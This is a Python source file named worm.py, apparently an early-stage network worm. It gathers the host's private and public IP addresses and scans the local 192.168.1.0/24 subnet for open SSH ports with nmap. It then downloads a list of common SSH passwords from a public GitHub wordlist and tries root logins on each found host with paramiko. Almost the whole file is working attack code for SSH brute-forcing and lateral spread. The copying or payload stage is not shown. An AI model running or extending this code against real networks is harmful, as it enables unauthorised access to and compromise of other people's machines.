####################################
# File name: worm.py               #
# Author: Filip Komárek   (pylyf)#
# Status: Development              #
# Date created: 7/6/2018           #
####################################
import nmap
import paramiko
import os
import logging
import socket
from urllib.request import urlopen
import urllib

# ------------------- Logging ----------------------- #
logger = logging.getLogger(__name__)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
debug = True # Set this to True to see debug messages
# --------------------------------------------------- #

def debug_print(text):
    """
    Prints debug messages only when debug mode is activated.

    Args:
        text: string
    """
    if debug:
        print("[?] " + text)


def get_private_ip():
    """
    Gets private IP address of this machine.
    This will be used for scanning other computers on LAN.

    Returns:
        private IP address
    """
    debug_print("Getting private IP")
    ip = socket.gethostbyname(socket.gethostname())
    debug_print("IP: " + ip)
    return ip
def get_public_ip():
    """
    Gets public IP address of this network.
    You can access the router with this ip too.

    Returns:
        public IP address
    """
    debug_print("Getting public IP")
    import re
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)


def scan_ssh_hosts():
    """
    Scans all machines on the same network that
     have SSH (port 22) enabled

    Returns:
        IP addresses of hosts
    """
    debug_print("Scanning machines on the same network with port 22 open.")

    port_scanner = nmap.PortScanner()
    port_scanner.scan('192.168.1.0/24', arguments='-p 22 --open')
    all_hosts = port_scanner.all_hosts()

    debug_print("Hosts: " + str(all_hosts))
    return all_hosts


def download_ssh_passwords():
    """
     Downloads most commonly used ssh passwords from a specific url
      Clearly, you can store passwords in a dictionary, but i found this more comfortable

    """

    # TODO: Move these passwords to my own website.

    debug_print("Downloading passwords...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
    urllib.request.urlretrieve(url, "passwords.txt")
    debug_print("Passwords downloaded!")


def connect_to_ssh(host, password):
    """
    Tries to connect to a SSH server

    Returns:
        True - Connection successful
        False - Something went wrong

    Args:
        host - Target machine's IP
        password - Password to use
    """

    # TODO: Pass usernames to the function too

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        debug_print("Connecting to: " + host)
        client.connect(host, 22, "root", password)
        debug_print("Successfully connected!")
        return True
    except socket.error:
        debug_print("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        debug_print("Wrong Password or Username")
        return False
